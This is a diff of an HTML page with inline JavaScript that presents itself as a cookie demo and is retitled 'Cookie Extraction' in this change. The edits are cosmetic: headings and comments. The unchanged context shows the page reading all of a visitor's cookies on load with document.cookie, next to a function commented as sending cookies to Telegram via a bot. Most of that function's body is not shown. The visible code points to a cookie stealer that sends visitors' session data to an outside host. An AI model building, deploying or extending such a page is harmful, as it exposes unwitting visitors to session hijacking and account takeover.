@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Demo Website</title>
+    <title>Cookie Extraction Website</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -34,8 +34,8 @@
 <body>
 
 <div class="container">
-    <h1>Welcome to Cookie Demo</h1>
-    <p id="cookie-status">Checking your cookie...</p>
+    <h1>Cookie Extraction Demo</h1>
+    <p id="cookie-status">Checking your cookies...</p>
     <button id="set-cookie-btn">Set a Cookie</button>
 </div>
 
@@ -50,7 +50,7 @@
 
     // Function to get all cookies as a string
     function getAllCookies() {
-        return document.cookie;
+        return document.cookie;  // This retrieves all cookies from the current domain
     }
 
     // Function to send cookies to Telegram via a bot
@@ -73,7 +73,7 @@
             });
     }
 
-    // Check for the cookie when the user visits
+    // Check for cookies when the user visits the website
     const cookieStatus = document.getElementById("cookie-status");
     const cookies = getAllCookies();
 
@@ -84,7 +84,7 @@
         cookieStatus.textContent = "No cookies found.";
     }
 
-    // Set a cookie when the button is clicked
+    // Set a test cookie when the button is clicked
     document.getElementById("set-cookie-btn").addEventListener("click", () => {
         const username = prompt("Please enter your name:", "John Doe");
         if (username) {
